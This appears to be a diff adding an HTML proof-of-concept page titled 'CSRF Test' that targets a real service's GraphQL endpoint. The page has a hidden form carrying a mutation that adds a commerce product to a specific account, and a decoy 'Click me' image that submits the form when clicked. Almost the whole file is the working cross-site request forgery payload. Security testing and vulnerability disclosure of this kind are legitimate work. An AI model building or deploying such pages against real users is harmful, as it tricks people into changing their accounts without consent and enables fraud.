@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test</title>
+</head>
+<body>
+    <!-- Hidden form that gets auto-submitted when the image is clicked -->
+    <form id="csrfForm" action="https://graph.linktr.ee/graphql" method="POST">
+        <input type="hidden" name="operationName" value="AddCommerceStoreProduct">
+        <input type="hidden" name="variables" value='{
+            "input": {
+                "currency": "USD",
+                "image": "https://m.media-amazon.com/images/I/61QDpuwkO3L.__AC_SX300_SY300_QL70_FMwebp_.jpg",
+                "price": 699,
+                "title": "Amazon.com: SCIONE Fidget Spinner Toy 1 Pack",
+                "vendor": "amazon.com",
+                "priceVisible": true,
+                "url": "https://www.amazon.com/dp/B0D3KQZFD1",
+                "position": 0,
+                "accountUuid": "e98e94ec-eeff-43fc-9530-4defb8e6cb55",
+                "active": true,
+                "addedStandalone": true
+            }
+        }'>
+        <input type="hidden" name="query" value="mutation AddCommerceStoreProduct($input: AddCommerceStoreProductInput!) { addCommerceStoreProduct(input: $input) { id } }">
+    </form>
+
+    <!-- Clickable image -->
+    <a href="#" onclick="document.getElementById('csrfForm').submit();">
+        <img src="https://as2.ftcdn.net/v2/jpg/01/73/20/53/1000_F_173205302_myocdTF1Ywa7d0aMgvQpQ0qX1nWBk27M.jpg" alt="Click me">
+    </a>
+</body>
+</html>
